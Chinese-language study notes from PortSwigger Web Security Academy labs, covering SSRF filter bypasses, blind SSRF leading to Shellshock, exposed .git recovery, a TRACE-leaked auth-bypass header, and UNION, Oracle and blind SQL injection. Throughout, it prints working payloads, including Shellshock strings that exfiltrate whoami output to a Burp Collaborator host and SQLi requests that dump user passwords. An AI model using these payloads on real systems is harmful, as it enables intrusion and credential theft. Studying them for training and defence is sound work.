## SSRF
SSRF漏洞点检测：

- xml请求的功能、由XXE引入
- SSRF via the Referer header
- 通过referer对请求来源进行分析


### 【盲SSRF进行shellshock】
没做出来，看了solution回来总结。
https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation

这个利用盲ssrf对服务器同网段主机进行shellshock扫描的题，
失败总结：
1、没有装 "Collaborator Everywhere"插件，导致只知道Referer能SSRF，而这个插件扫出来UA也可以SSRF。这样才解释了如果只能控制一个URL，如何进行Shellshock攻击的问题
2、Shellshock的payload的问题，我
```
() { :;}; /usr/bin/nslookup $(whoami).jre1ragoptseyerv71cxzk9wun0ood.burpcollaborator.net
() { :;}; bash -c nslookup $(whoami).ovn6vfkttywj2jv0b6g23pd1ys4vsk.burpcollaborator.net
() { :;}; bash -c nslookup `whoami`.ovn6vfkttywj2jv0b6g23pd1ys4vsk.burpcollaborator.net
() { :;}; bash -c nslookup '`whoami`.ovn6vfkttywj2jv0b6g23pd1ys4vsk.burpcollaborator.net'
() { :;}; bash -c nslookup %27`whoami`.ovn6vfkttywj2jv0b6g23pd1ys4vsk.burpcollaborator.net%27
```
正确是：
```
() { :;}; /usr/bin/nslookup $(whoami).ovn6vfkttywj2jv0b6g23pd1ys4vsk.burpcollaborator.net
```
另外发现,不用bash -c也是可以执行的：
() { :;}; nslookup $(whoami).ovn6vfkttywj2jv0b6g23pd1ys4vsk.burpcollaborator.net


### 【blacklist-based的SSRF】

使用包含localhost、127.0.0.1的字符串的时候，都碰到
响应400："External stock check blocked for security reasons"
说明localhost、127.0.0.1都被黑名单了，尝试xxx.127.0.0.9.nip.进行域名的绕过
```
stockApi=http%3A%2F%2Fstock.weliketoshop.net.127.0.0.9.nip.io%2Fadmin
```
响应400："External stock check blocked for security reasons"

然后把admin放到域名中，碰到同样的情况，
说明admin被黑名单了。

切换大小写：
```
stockApi=http%3A%2F%2Fstock.weliketoshop.net.127.0.0.9.nip.io%2FadmiN
```
响应500："Could not connect to external stock check service"

发现原来我的绕过姿势不对，
应该是用 127.1或者127.0.1。


### 【whitelist-based的SSRF】


失败：
```
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%25%35%63@stock.weliketoshop.net.127.0.0.9.nip.io%2Fadmin
```
响应400：
"External stock check host must be stock.weliketoshop.net"


把四个技巧都结合起来了，
```
stockApi=http%3A%2F%2Fstock.weliketoshop.net@stock.weliketoshop.net.127.0.0.1.nip.io%25%32%33stock.weliketoshop.net%2F%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
```
依然不对，
```
stockApi=http%3A%2F%2Fstock.weliketoshop.net%25%34%30stock.weliketoshop.net.127.0.0.1.nip.io%25%32%33stock.weliketoshop.net%2F%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
```
还是不对，


后来看writeup才知道姿势错了，思路不对，
我的思路是
```
http://stock.weliketoshop.net@localhost
```
实际上的思路是：
```
http://localhost#stock.weliketoshop.net
```
最终的payload是：
```
http%3A%2F%2Flocalhost%25%32%33@stock.weliketoshop.net/admin
```
解码之后的样子：
```
http://localhost#@stock.weliketoshop.net/admin
```

另外一个方法，
通过观察：https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
的payload：
```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```
发现主要是
```
\
:
&
#
@
```
以及他们的url编码形式的排列组合。
于是使用以下字符进行爆破：
```
%25
%40
%23
%5c
%3a
%
@
#
\
:
```
构造的payload为：
```
stockApi=http%3A%2F%2Fstock.weliketoshop.net§X§localhost/admin
```
以及
```
stockApi=http%3A%2F%2Flocalhost§X§%2Fstock.weliketoshop.net/admin
```
然后在intruder里Payload Type选择`Custom iterator`，对Position1,2,3进行组合之后爆破。
记得在发出之前对请求进行url编码。

![image](https://user-images.githubusercontent.com/30398606/143370505-e51c4091-08ba-43e1-bb7f-3996c5ae85cb.png)

![image](https://user-images.githubusercontent.com/30398606/143370462-050f2ddc-4603-48c1-922c-324b842d74e6.png)

最后得到可用的payload为：
```
603	%25%32%33%25%32%35%40	200	false	false	3042	
613	%25%32%33%25%34%30%40	200	false	false	3042	
623	%25%32%33%25%32%33%40	200	false	false	3042	
633	%25%32%33%25%35%63%40	200	false	false	3042	
643	%25%32%33%25%33%61%40	200	false	false	3042	
693	%25%32%33%3a%40	        200	false	false	3042	
```
![image](https://user-images.githubusercontent.com/30398606/143374668-27f6aae9-bd1b-4eee-adca-6218381e4999.png)

从结果可以看出，只有`#`需要编码两次，其他的字符`@`，以及`#`和`@`之前的任意字符编码0-1次都行。

## 信息泄露
### git泄露
使用这个：https://github.com/lijiejie/GitHack
只是恢复到最新版本，想要从历史版本中拿到信息，需要先恢复到历史版本。

```
wget -r -p -np -k https://ac811fd51f384810c034064700c800c6.web-security-academy.net/.git/

cqq@cqq:~/repos/githacker/ac811fd51f384810c034064700c800c6.web-security-academy.net$ git log
error: unable to open object pack directory: .git/objects/pack: Not a directory
commit f5caf8aee8cbae21767b6a9b1d5a631a4f9bee3a (HEAD -> master)
Author: Carlos Montoya <carlos@evil-user.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

commit 9da676888a6391f937f50b8a590250bd61773a4e
Author: Carlos Montoya <carlos@evil-user.net>
Date:   Mon Jun 22 16:23:42 2020 +0000

    Add skeleton admin panel
cqq@cqq:~/repos/githacker/ac811fd51f384810c034064700c800c6.web-security-academy.net$ git reset --hard 9da676888a6391f937f50b8a590250bd61773a4e
error: unable to open object pack directory: .git/objects/pack: Not a directory
HEAD is now at 9da6768 Add skeleton admin panel
cqq@cqq:~/repos/githacker/ac811fd51f384810c034064700c800c6.web-security-academy.net$ ls -al
total 20
drwxrwxr-x 3 cqq cqq 4096 Nov 22 03:09 .
drwxrwxr-x 7 cqq cqq 4096 Nov 22 03:06 ..
-rw-rw-r-- 1 cqq cqq   36 Nov 22 03:09 admin.conf
-rw-rw-r-- 1 cqq cqq   88 Nov 22 03:09 admin_panel.php
drwxrwxr-x 7 cqq cqq 4096 Nov 22 03:09 .git
cqq@cqq:~/repos/githacker/ac811fd51f384810c034064700c800c6.web-security-academy.net$ cat *.php
<?php echo 'TODO: build an amazing admin panel, but remember to check the password!'; ?>cqq@cqq:~/repos/githacker/ac811fd51f384810c034064700c800c6.web-security-academy.net$ 
cqq@cqq:~/repos/githacker/ac811fd51f384810c034064700c800c6.web-security-academy.net$ 
cqq@cqq:~/repos/githacker/ac811fd51f384810c034064700c800c6.web-security-academy.net$ 
cqq@cqq:~/repos/githacker/ac811fd51f384810c034064700c800c6.web-security-academy.net$ cat admin.conf
ADMIN_PASSWORD=6mm8cske6vswxw0z1ejk
```
好像使用这个工具也可以，不过没试：
https://github.com/wangyihang/githacker


### 特殊请求头的认证绕过
开始一直没找到这个特殊的请求头在什么地方，后来通过burp的scanner扫到了开启了TRACE方法，在TRACE方法中泄露了这个特殊的请求头，加上这个
```
X-Custom-IP-Authorization: 127.0.0.1
```

访问/admin 即可成功。

## SQLi

payload是：
```
/filter?category=Gifts'+UNION+SELECT+§NULL§,§NULL§,§NULL§--+
```
然后用Sniper进行Intruder爆破，只用那个hint中的字符串作为字典。即可爆出非500响应（200）的请求。



### Oracle SQLi:


测试发现：
```
/filter?category=Accessories'+UNION+SELECT+NULL,(SELECT+banner+FROM+v$version+where+rownum=1)+from+DUAL--+

/filter?category=Accessories'+UNION+SELECT+NULL,(SELECT+banner+FROM+v$version+where+banner+like'Oracle%')+from+DUAL--+
```
都可以，但是发现没有题中指定的字符串，于是自己拼接，用concat。但是注意拼接的时候一定要from DUAL。还有就是SELECT语句一定要用()包裹起来。


```
SELECT NULL,(SELECT concat('a','b') from DUAL) from DUAL
SELECT NULL,(SELECT concat('a',(SELECT+banner+FROM+v$version+where+banner+like'Oracle%')) from DUAL) from DUAL
```


最终payload：
```
/filter?category=Accessories'+UNION+SELECT+NULL,(SELECT+concat((SELECT+banner+FROM+v$version+where+banner+like'Oracle%'),',%20PL/SQL+Release+11.2.0.2.0+-+Production,+CORE%0911.2.0.2.0%09Production,+TNS+for+Linux%3a+Version+11.2.0.2.0+-+Production,+NLSRTL+Version+11.2.0.2.0+-+Production')+from+DUAL)+from+DUAL--+

```
看了答案发现实际上只需要：
```
/filter?category=Accessories'+UNION+SELECT+NULL,BANNER+FROM+v$version--+
```
之前我忘了以为最外面只能from DUAL...


### Listing the contents of the database(非Oracle)

找出所有的表名：
```
/filter?category=Gifts'+UNION+SELECT+null,TABLE_NAME+FROM+information_schema.tables--+
```
在结果中查找users，找到一个可疑的表：
users_cusczd


现在知道可疑的表了，但是不知道它有哪些字段。只能猜测。
找出users_cusczd这个表的username字段：
```
/filter?category=Gifts'+UNION+SELECT+null,(SELECT+COLUMN_NAME+FROM+information_schema.columns+WHERE+table_name='users_cusczd'+and+COLUMN_NAME+like+'user%')--+
```
username_ugawcz

找出password字段
```
/filter?category=Gifts'+UNION+SELECT+null,(SELECT+COLUMN_NAME+FROM+information_schema.columns+WHERE+table_name='users_cusczd'+and+COLUMN_NAME+like+'pass%')--+
```
password_ooewrz


现在查用户名密码：
```
select username_ugawcz,password_ooewrz from users_cusczd limit 1;
```
最终payload：
```
/filter?category=Gifts'+UNION+SELECT+username_ugawcz,password_ooewrz+FROM+users_cusczd--+
```


### Oracle
查出所有table，以及其owner：
```
/filter?category=Pets'+UNION+SELECT+owner,table_name+from+all_tables--+
```
在结果中找到一个表名：USERS_SOPHSG
然后找这个表的字段：
```
/filter?category=Pets'+UNION+SELECT+null,column_name+from+all_tab_columns+where+table_name='USERS_SOPHSG'--+
```
得到两个字段：
```
PASSWORD_TSXMFO
USERNAME_XEZYZA
```
然后查询用户密码：
```
select USERNAME_XEZYZA,PASSWORD_TSXMFO from USERS_SOPHSG;
```

最终payload：
```
/filter?category=Pets'+UNION+select+USERNAME_XEZYZA,PASSWORD_TSXMFO+from+USERS_SOPHSG--+
```


### 条件布尔盲注

先判断密码长度：
```
TrackingId=0UbSO8BsfUjt5Ndd'+and+(select+length(password)+from+users+where+username='administrator')=§6§+and+'1'='1
```
确定是20，然后进行枚举每个字符：

```
TrackingId=0UbSO8BsfUjt5Ndd'+and+substring((select+password+from+users+where+username='administrator'),1,17)='9palugrxf5py3nts§a§
```
比较漫长，听说可以用二分法，但是我还不会。

### 错误布尔盲注

不是报错注入。而是服务的响应不会因为条件的不同而变化，而是只会根据异常/错误而发生变化。

利用`CASE`关键字，
原理：
```
mysql> select username  from users where (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a';
+----------+
| username |
+----------+
| admin    |
| cqq      |
+----------+
2 rows in set (0.01 sec)

mysql> select username  from users where (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a';
Empty set, 1 warning (0.00 sec)
```

Oracle数据库：
```
	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual
```


判断密码长度：
```
TrackingId=E9d1f64czlz1z3sN'+and+(SELECT+CASE+WHEN+((select+length(password)+from+users+where+username='administrator')=§6§)+THEN+to_char(1/0)+ELSE+'a'+END+FROM+dual)='a
```

当20时，响应500，可知密码长度为20。


参考：
- https://portswigger.net/web-security/sql-injection/cheat-sheet



ref:
- https://www.techonthenet.com/oracle/functions/concat.php
- https://github.com/jhaddix/tbhm/blob/master/06_SQLi.md
- https://cheatography.com/dormidera/cheat-sheets/oracle-sql-injection/
- http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
- https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
